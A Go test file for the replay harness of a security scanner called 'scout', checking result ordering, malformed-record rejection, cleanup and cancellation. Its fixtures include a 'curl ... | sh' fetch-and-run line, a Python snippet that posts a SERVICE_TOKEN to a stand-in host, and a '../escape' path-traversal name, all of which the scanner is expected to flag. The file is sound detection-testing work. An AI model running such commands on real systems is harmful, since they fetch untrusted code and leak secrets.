package replay_test

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/skarm/scout"
	"github.com/skarm/scout/fetch"
	"github.com/skarm/scout/internal/dev/replay"
	"github.com/skarm/scout/internal/signatures"
	"github.com/skarm/scout/internal/syntax/frontend"
	"github.com/skarm/scout/osv"
	"github.com/skarm/scout/report"
)

func TestReplayPreservesOrderPathsEvidenceAndPartialFindings(t *testing.T) {
	input := record(t, 2, capturedFile{Name: "docs/README.txt", Data: []byte("SCOUT_PRIVATE_SENTINEL")}, capturedFile{
		Name: "src/install.txt",
		Data: []byte("curl https://example.invalid/install | sh"),
	}) +
		record(t, 1, capturedFile{Name: "README.txt", Data: []byte("ordinary text")}) +
		record(t, 3, capturedFile{Name: "program.ps1", Data: []byte("Write-Output 'ordinary'")})
	var out bytes.Buffer
	summary, err := replay.Run(context.Background(), scanner(t, options()), strings.NewReader(input), &out, runOptions())
	if err != nil {
		t.Fatal(err)
	}
	got := rows(t, out.Bytes())
	if summary.Inputs != 3 || summary.Complete != 2 || summary.Incomplete != 1 || summary.Failed != 0 || summary.RuntimeErrors != 0 || len(got) != 3 {
		t.Fatalf("summary=%+v rows=%d", summary, len(got))
	}
	for i, id := range []int{2, 1, 3} {
		if got[i].ID != fmt.Sprintf("%064x", id) || got[i].Version != scout.Version() || got[i].BudgetSeconds != 5 || !strings.HasPrefix(got[i].RunDigest, "sha256:") {
			t.Fatalf("row %d metadata=%+v", i, got[i])
		}
	}
	if got[0].Decision != report.Block || got[1].Decision != report.Allow || got[2].State != report.RunIncomplete || got[2].Decision == report.Allow || got[2].Error != "" {
		t.Fatalf("wrong state/policy: %s %s %s/%s/%s", got[0].Decision, got[1].Decision, got[2].State, got[2].Decision, got[2].Error)
	}
	found := false
	for _, finding := range got[0].Findings {
		if finding.RuleID == "EX001" && finding.Location.Path == "src/install.txt" && finding.Location.ByteEnd > finding.Location.ByteStart && finding.Evidence.FileSHA256 != "" && finding.Evidence.SpanSHA256 != "" {
			found = true
		}
	}
	if !found || strings.Contains(out.String(), "SCOUT_PRIVATE_SENTINEL") || strings.Contains(out.String(), "https://example.invalid/install") {
		t.Fatal("evidence missing or captured source disclosed")
	}
}

func TestRejectedCapturedFilesProduceRowsAndContinue(t *testing.T) {
	o := options()
	o.Limits.Capture.MaxFileBytes, o.Limits.Capture.MaxTotalBytes, o.Limits.MaxCaptureBytes = 4, 4, 4
	input := record(t, 1, capturedFile{Name: "../escape", Data: []byte("x")}) + record(t, 2, capturedFile{
		Name: "big.txt",
		Data: []byte("too large"),
	}) + record(t, 3, capturedFile{
		Name: "ok.txt",
		Data: []byte("safe"),
	})
	var out bytes.Buffer
	summary, err := replay.Run(context.Background(), scanner(t, o), strings.NewReader(input), &out, runOptions())
	if err != nil {
		t.Fatal(err)
	}
	got := rows(t, out.Bytes())
	if summary.Inputs != 3 || summary.Complete != 1 || summary.Failed != 2 || summary.RuntimeErrors != 0 || len(got) != 3 {
		t.Fatalf("summary=%+v rows=%d", summary, len(got))
	}
	if got[0].Error != "unsupported captured path" || got[1].Error != "input byte limit" || got[2].Error != "" || got[2].Decision != report.Allow {
		t.Fatal("rejected record was dropped or admitted")
	}
	for _, row := range got[:2] {
		if row.State != report.RunFailed || row.Coverage != report.Failed || row.Decision == report.Allow {
			t.Fatal("rejected input labelled clean")
		}
	}
}

func TestPrivateReplayDirectoriesAreRemovedAndNeverExecuted(t *testing.T) {
	base := t.TempDir()
	t.Setenv("TMPDIR", base)
	marker := filepath.Join(t.TempDir(), "executed")
	input := record(t, 1, capturedFile{
		Name:       "bin/run.sh",
		Data:       []byte("#!/bin/sh\ntouch '" + marker + "'\n"),
		Executable: true,
	}, capturedFile{
		Name: "docs/nested/readme.txt",
		Data: []byte("safe"),
	})
	var out bytes.Buffer
	if _, err := replay.Run(context.Background(), scanner(t, options()), strings.NewReader(input), &out, runOptions()); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Lstat(marker); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("target was executed: %v", err)
	}
	entries, err := os.ReadDir(base)
	if err != nil || len(entries) != 0 {
		t.Fatalf("private capture directories leaked: entries=%d err=%v", len(entries), err)
	}
}

func TestStrictRecordSchemaAndUniqueIDs(t *testing.T) {
	id := strings.Repeat("a", 64)
	for name, input := range map[string]string{
		"unknown":             `{"id":"` + id + `","files":[],"raw_source":"never"}`,
		"duplicate":           `{"id":"` + id + `","id":"` + id + `","files":[]}`,
		"case alias":          `{"ID":"` + id + `","files":[]}`,
		"null files":          `{"id":"` + id + `","files":null}`,
		"null data":           `{"id":"` + id + `","files":[{"name":"x.txt","data":null}]}`,
		"missing data":        `{"id":"` + id + `","files":[{"name":"x.txt"}]}`,
		"invalid base64":      `{"id":"` + id + `","files":[{"name":"x.txt","data":"!"}]}`,
		"noncanonical base64": `{"id":"` + id + `","files":[{"name":"x.txt","data":"Zh=="}]}`,
		"file duplicate":      `{"id":"` + id + `","files":[{"name":"x.txt","name":"z.txt","data":""}]}`,
		"unknown file":        `{"id":"` + id + `","files":[{"name":"x.txt","data":"","command":"never"}]}`,
		"invalid executable":  `{"id":"` + id + `","files":[{"name":"x.txt","data":"","executable":1}]}`,
		"trailing":            `{"id":"` + id + `","files":[]} {}`,
		"invalid id":          `{"id":"not-a-capture-id","files":[]}`,
		"blank":               "\n",
	} {
		t.Run(name, func(t *testing.T) {
			var out bytes.Buffer
			if _, err := replay.Run(context.Background(), scanner(t, options()), strings.NewReader(input), &out, runOptions()); err == nil || out.Len() != 0 {
				t.Fatalf("ambiguous record accepted: err=%v bytes=%d", err, out.Len())
			}
		})
	}
	valid := record(t, 1, capturedFile{Name: "x.txt", Data: []byte("safe")})
	var out bytes.Buffer
	summary, err := replay.Run(context.Background(), scanner(t, options()), strings.NewReader(valid+valid), &out, runOptions())
	if err == nil || summary.Inputs != 1 || len(rows(t, out.Bytes())) != 1 {
		t.Fatalf("duplicate ID or valid prefix lost: %+v %v", summary, err)
	}
}

func TestNamespaceAndConfiguredFileCountAreEnforced(t *testing.T) {
	for _, files := range [][]capturedFile{
		{{Name: "README.txt", Data: []byte("a")}, {Name: "readme.txt", Data: []byte("b")}},
		{{Name: "a", Data: []byte("a")}, {Name: "a/b.txt", Data: []byte("b")}},
	} {
		var out bytes.Buffer
		summary, err := replay.Run(context.Background(), scanner(t, options()), strings.NewReader(record(t, 1, files...)), &out, runOptions())
		if err != nil || summary.Failed != 1 || rows(t, out.Bytes())[0].Error != "unsupported captured path" {
			t.Fatalf("path collision accepted: %+v %v", summary, err)
		}
	}
	o := options()
	o.Limits.Capture.MaxFiles, o.Limits.MaxCaptureFiles = 1, 1
	var out bytes.Buffer
	summary, err := replay.Run(context.Background(), scanner(t, o), strings.NewReader(record(t, 1, capturedFile{
		Name: "a.txt",
		Data: []byte("a"),
	}, capturedFile{
		Name: "b.txt",
		Data: []byte("b"),
	})), &out, runOptions())
	if err != nil || summary.Failed != 1 || rows(t, out.Bytes())[0].Error != "input file count limit" {
		t.Fatalf("configured file cap lost: %+v %v", summary, err)
	}
}

func TestOfflinePlanAndOptionsBeforeInputRead(t *testing.T) {
	o := options()
	download := fetch.DefaultOptions()
	download.Enabled = true
	o.Download = &download
	if _, err := replay.Run(context.Background(), scanner(t, o), forbiddenReader{}, io.Discard, runOptions()); err == nil {
		t.Fatal("download-enabled scanner accepted")
	}
	o = options()
	v := osv.DefaultOptions()
	v.Enabled = true
	v.Offline = []byte(`{"version":1,"queried_at":"2026-10-27T00:00:00Z","records":[]}`)
	o.Vulnerabilities = &v
	if _, err := replay.Run(context.Background(), scanner(t, o), forbiddenReader{}, io.Discard, runOptions()); err == nil {
		t.Fatal("offline external-service scanner accepted")
	}
	for _, o := range []replay.Options{{Workers: 0, Timeout: time.Second}, {Workers: 9, Timeout: time.Second}, {
		Workers: 1,
		Timeout: 0,
	}} {
		if _, err := replay.Run(context.Background(), scanner(t, options()), forbiddenReader{}, io.Discard, o); err == nil {
			t.Fatal("invalid replay budget accepted")
		}
	}
}

func TestIOErrorsKeepValidPrefixAndStopWorkers(t *testing.T) {
	input := record(t, 1, capturedFile{Name: "x.txt", Data: []byte("safe")})
	broken := errors.New("test IO failure")
	var out bytes.Buffer
	summary, err := replay.Run(context.Background(), scanner(t, options()), io.MultiReader(strings.NewReader(input), brokenReader{err: broken}), &out, runOptions())
	if !errors.Is(err, broken) || summary.Inputs != 1 || len(rows(t, out.Bytes())) != 1 {
		t.Fatalf("input failure lost prefix: %+v %v", summary, err)
	}
	for _, writer := range []io.Writer{brokenWriter{err: broken}, brokenWriter{short: true}} {
		s := scanner(t, options())
		if _, err := replay.Run(context.Background(), s, strings.NewReader(input), writer, runOptions()); err == nil {
			t.Fatal("output failure ignored")
		}
		closed := make(chan struct{})
		go func() { _ = s.Close(); close(closed) }()
		select {
		case <-closed:
		case <-time.After(time.Second):
			t.Fatal("replay workers leaked after writer failure")
		}
	}
}

func TestCancellationHonorsBoundedOrderedWindow(t *testing.T) {
	var input strings.Builder
	for i := range 20 {
		input.WriteString(record(t, i, capturedFile{Name: "x.txt", Data: []byte("safe")}))
	}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	out := &cancelWriter{cancel: cancel}
	o := runOptions()
	summary, err := replay.Run(ctx, scanner(t, options()), strings.NewReader(input.String()), out, o)
	got := rows(t, out.Bytes())
	if !errors.Is(err, context.Canceled) || summary.Inputs < 1 || summary.Inputs > 2*o.Workers || len(got) != summary.Inputs {
		t.Fatalf("unbounded or dropped accepted window: %+v rows=%d err=%v", summary, len(got), err)
	}
	for i, row := range got {
		if row.ID != fmt.Sprintf("%064x", i) {
			t.Fatal("output reordered")
		}
	}
}

func TestNativePythonSubsetHasNoGenericRuntimeFault(t *testing.T) {
	for _, name := range []string{"python", "yaml", "toml"} {
		if !frontend.BackendFor(name).Available {
			t.Skip("native parser required")
		}
	}
	if !signatures.Backend().Available {
		t.Skip("native YARA-X required")
	}
	data := []byte("import os\nimport requests\ntoken=os.getenv('SERVICE_TOKEN')\nrequests.post('https://receiver.invalid',data=token)\n")
	var out bytes.Buffer
	summary, err := replay.Run(context.Background(), scanner(t, scout.DefaultOptions()), strings.NewReader(record(t, 1, capturedFile{
		Name: "sentinel.py",
		Data: data,
	})), &out, runOptions())
	if err != nil {
		t.Fatal(err)
	}
	got := rows(t, out.Bytes())
	if summary.Complete != 1 || summary.RuntimeErrors != 0 || got[0].Error != "" || got[0].State != report.RunComplete || got[0].Decision != report.Block || got[0].Coverage != report.Complete {
		t.Fatalf("expected static gap counted as fault: %+v row=%+v", summary, got[0])
	}
	found := false
	for _, f := range got[0].Findings {
		if f.RuleID == "PY-TT3" {
			found = true
		}
	}
	if !found {
		t.Fatal("native source-to-sink evidence lost")
	}
}

func TestBase64LimitRetainsValidOversizedRecord(t *testing.T) {
	o := options()
	o.Limits.Capture.MaxFileBytes = 4
	encoded := base64.StdEncoding.EncodeToString([]byte("over limit"))
	input := `{"id":"` + strings.Repeat("a", 64) + `","files":[{"name":"x.txt","data":"` + encoded + `"}]}`
	var out bytes.Buffer
	summary, err := replay.Run(context.Background(), scanner(t, o), strings.NewReader(input), &out, runOptions())
	if err != nil || summary.Inputs != 1 || summary.Failed != 1 || rows(t, out.Bytes())[0].Error != "input byte limit" {
		t.Fatalf("oversized record lost: %+v %v", summary, err)
	}
}

func TestClosedScannerProducesExplicitRuntimeFailure(t *testing.T) {
	s := scanner(t, options())
	if err := s.Close(); err != nil {
		t.Fatal(err)
	}
	var out bytes.Buffer
	summary, err := replay.Run(context.Background(), s, strings.NewReader(record(t, 1, capturedFile{
		Name: "README.txt",
		Data: []byte("safe"),
	})), &out, runOptions())
	if err != nil {
		t.Fatal(err)
	}
	got := rows(t, out.Bytes())
	if summary.Inputs != 1 || summary.Failed != 1 || summary.RuntimeErrors != 1 || len(got) != 1 || got[0].Error == "" || got[0].State != report.RunFailed || got[0].Decision == report.Allow || got[0].RunDigest != "" {
		t.Fatalf("closed scanner labelled clean: summary=%+v rows=%d", summary, len(got))
	}
}

func TestCancellationAfterRecordAdmissionPublishesCancelledOutcome(t *testing.T) {
	runtime := scanner(t, options())
	temporary := t.TempDir()
	t.Setenv("TMPDIR", temporary)
	ctx, cancel := context.WithCancel(t.Context())
	defer cancel()
	input := record(t, 1, capturedFile{Name: "README.txt", Data: []byte("ordinary text")})
	var output bytes.Buffer
	summary, err := replay.Run(ctx, runtime, cancelAtEOFReader{input: strings.NewReader(input), cancel: cancel}, &output, runOptions())
	observed := rows(t, output.Bytes())
	if !errors.Is(err, context.Canceled) || summary.Inputs != 1 || summary.Failed != 1 || summary.RuntimeErrors != 1 || len(observed) != 1 {
		t.Fatal(summary, err, observed)
	}
	outcome := observed[0]
	if outcome.State != report.RunCancelled || outcome.Error != "replay_deadline" || outcome.Coverage != report.Failed || outcome.Decision != report.Review || outcome.RunDigest != "" {
		t.Fatal(outcome)
	}
	entries, err := os.ReadDir(temporary)
	if err != nil || len(entries) != 0 {
		t.Fatal("cancelled replay materialized a capture", entries, err)
	}
}

func TestUnavailablePrivateCaptureStorageProducesExplicitRuntimeFailure(t *testing.T) {
	for _, kind := range []string{"missing-directory", "regular-file"} {
		t.Run(kind, func(t *testing.T) {
			runtime := scanner(t, options())
			base := t.TempDir()
			unavailable := filepath.Join(base, "unavailable")
			if kind == "regular-file" {
				if err := os.WriteFile(unavailable, []byte("not a directory"), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			t.Setenv("TMPDIR", unavailable)
			var output bytes.Buffer
			summary, err := replay.Run(t.Context(), runtime, strings.NewReader(record(t, 1, capturedFile{
				Name: "README.txt",
				Data: []byte("ordinary text"),
			})), &output, runOptions())
			observed := rows(t, output.Bytes())
			if err != nil || summary.Inputs != 1 || summary.Failed != 1 || summary.RuntimeErrors != 1 || len(observed) != 1 {
				t.Fatal(summary, err, observed)
			}
			outcome := observed[0]
			if outcome.State != report.RunFailed || outcome.Error != "replay_capture_error" || outcome.Coverage != report.Failed || outcome.Decision != report.Review || outcome.RunDigest != "" {
				t.Fatal(outcome)
			}
			entries, err := os.ReadDir(base)
			if err != nil {
				t.Fatal(err)
			}
			want := 0
			if kind == "regular-file" {
				want = 1
			}
			if len(entries) != want {
				t.Fatal("capture storage failure leaked files", entries)
			}
		})
	}
}

type capturedFile struct {
	Name       string `json:"name"`
	Data       []byte `json:"data"`
	Executable bool   `json:"executable,omitempty"`
}

type replayRow struct {
	ID            string              `json:"id"`
	Version       string              `json:"version"`
	BudgetSeconds int                 `json:"budget_seconds"`
	Error         string              `json:"error"`
	State         report.State        `json:"state"`
	RunDigest     string              `json:"run_digest"`
	Coverage      report.Completeness `json:"coverage"`
	Decision      report.Decision     `json:"decision"`
	Findings      []report.Finding    `json:"findings"`
	Diagnostics   []string            `json:"diagnostics"`
}

func options() scout.Options {
	o := scout.DefaultOptions()
	o.Profile, o.Checks = scout.Custom, &scout.Checks{}
	return o
}

func scanner(t *testing.T, options scout.Options) *scout.Scanner {
	t.Helper()
	s, err := scout.New(context.Background(), options)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if err := s.Close(); err != nil {
			t.Error(err)
		}
	})
	return s
}

func record(t *testing.T, id int, files ...capturedFile) string {
	t.Helper()
	data, err := json.Marshal(struct {
		ID    string         `json:"id"`
		Files []capturedFile `json:"files"`
	}{ID: fmt.Sprintf("%064x", id), Files: files})
	if err != nil {
		t.Fatal(err)
	}
	return string(data) + "\n"
}

func rows(t *testing.T, output []byte) []replayRow {
	t.Helper()
	d := json.NewDecoder(bytes.NewReader(output))
	var out []replayRow
	for {
		var row replayRow
		err := d.Decode(&row)
		if errors.Is(err, io.EOF) {
			return out
		}
		if err != nil {
			t.Fatal(err)
		}
		out = append(out, row)
	}
}

func runOptions() replay.Options { return replay.Options{Workers: 2, Timeout: 5 * time.Second} }

type forbiddenReader struct{}

func (forbiddenReader) Read([]byte) (int, error) { panic("replay read input before rejecting options") }

type brokenReader struct{ err error }

func (r brokenReader) Read([]byte) (int, error) { return 0, r.err }

type brokenWriter struct {
	err   error
	short bool
}

func (w brokenWriter) Write(p []byte) (int, error) {
	if w.short {
		return len(p) - 1, nil
	}
	return 0, w.err
}

type cancelWriter struct {
	bytes.Buffer
	cancel context.CancelFunc
}

func (w *cancelWriter) Write(p []byte) (int, error) { w.cancel(); return w.Buffer.Write(p) }

type cancelAtEOFReader struct {
	input  *strings.Reader
	cancel context.CancelFunc
}

func (r cancelAtEOFReader) Read(data []byte) (int, error) {
	n, err := r.input.Read(data)
	if errors.Is(err, io.EOF) {
		r.cancel()
	}
	return n, err
}
